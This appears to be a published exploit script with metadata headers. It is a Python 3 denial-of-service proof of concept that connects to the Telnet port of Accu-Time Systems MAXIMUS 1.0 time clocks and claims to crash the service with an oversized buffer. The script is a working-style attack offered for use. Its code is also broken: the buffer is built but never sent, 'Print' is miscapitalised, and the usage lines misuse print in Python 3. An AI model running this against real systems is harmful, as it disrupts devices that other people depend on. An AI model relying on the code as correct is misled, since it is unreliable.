# Exploit Title: Accu-Time Systems MAXIMUS 1.0 - Telnet Remote Buffer Overflow (DoS)
# Discovered by: Yehia Elghaly
# Discovered Date: 22/12/2021
# Vendor Homepage: https://www.accu-time.com/
# Software Link : https://www.accu-time.com/maximus-employee-time-clock-3/
# Tested Version: 1.0
# Vulnerability Type:  Buffer Overflow (DoS) Remote
# Tested on OS: linux 

# Description: Accu-Time Systems MAXIMUS 1.0 Telnet Remote Buffer Overflow

# Steps to reproduce:
# 1. - Accu-Time Systems MAXIMUS 1.0 Telnet listening on port 23
# 2. - Run the Script from remote PC/IP
# 3. - Telnet Crashed

#!/usr/bin/env python3

import socket
import sys
print("#######################################################")
print("# Accu-Time Systems MAXIMUS Remote (BUffer Overflow)  #")
print("#   	        --------------------------               #")
print("#               BY  Yehia Elghaly                     #")
print("#######################################################")

if (len(sys.argv)<2):
	print ("Usage: %s <Target Host> ") % sys.argv[0]
	print ("Example: %s 192.168.113.1 ") % sys.argv[0]
	exit(0)

print ("\nSending Evil.......Buffer...")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
 s.connect((sys.argv[1], 23))
 buffer = "A"*9400
 s.send(" Crashed Check the connection")
 Print ("Crashed")
except:
 print ("Could not connect to ACCU Time Telnet!")